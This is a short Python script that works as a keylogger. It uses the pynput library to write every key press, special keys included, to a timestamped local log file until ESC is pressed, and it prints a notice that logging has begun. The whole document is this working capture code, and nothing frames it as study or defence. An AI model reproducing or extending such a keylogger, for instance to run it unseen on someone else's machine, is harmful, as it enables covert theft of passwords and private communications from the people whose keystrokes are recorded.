from pynput import keyboard
import logging
from datetime import datetime

# Set up logging configuration
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key Pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

# Start the listener
print(f"Keylogger started. Logging to {log_filename}")
print("Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
